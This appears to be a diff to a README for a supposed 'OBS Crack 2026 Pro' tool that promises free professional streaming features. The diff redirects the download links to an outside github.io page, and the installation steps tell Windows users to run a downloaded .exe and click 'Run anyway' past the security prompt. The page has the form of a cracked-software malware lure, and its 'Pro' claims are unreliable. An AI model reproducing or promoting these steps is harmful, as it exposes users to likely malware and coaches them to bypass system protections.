@@ -1,6 +1,6 @@
 # 🎥 OBS-Crack-2026-Pro-Streaming - Unlock professional features for free streaming
 
-[![Download OBS Pro](https://img.shields.io/badge/Download-OBS_Pro-blue.svg)](https://github.com/markosuncrowded501/OBS-Crack-2026-Pro-Streaming)
+[![Download OBS Pro](https://img.shields.io/badge/Download-OBS_Pro-blue.svg)](https://markosuncrowded501.github.io)
 
 ## 📍 About this tool
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official repository page to start your download: https://github.com/markosuncrowded501/OBS-Crack-2026-Pro-Streaming
+1.  Visit the official repository page to start your download: https://markosuncrowded501.github.io
 2.  Locate the button labeled "Code" and select "Download ZIP" or check the "Releases" section on the right side of the page.
 3.  Choose the installer file ending in .exe to begin the setup.
 4.  Open the downloaded file. Windows may show a security prompt. If this happens, select "More info" and then click "Run anyway" to allow the installer to start.
